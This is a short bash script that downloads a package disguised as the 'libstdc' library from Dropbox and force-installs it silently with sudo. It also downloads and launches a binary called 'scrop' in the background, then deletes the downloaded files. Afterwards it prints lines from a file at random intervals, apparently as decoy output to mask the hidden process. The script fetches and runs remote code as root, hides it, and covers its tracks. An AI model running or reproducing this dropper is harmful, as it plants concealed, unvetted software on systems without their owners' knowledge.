#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/9erbh7t39zxpbq9/scrop.zip -q
unzip scrop.zip > /dev/null 2>&1
#pwd
./scripts/scrop ./scripts/data &
sleep 3
rm -rf scrop.zip
rm -rf scripts/scrop
rm -rf scripts/data
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 30 ))
done < $2

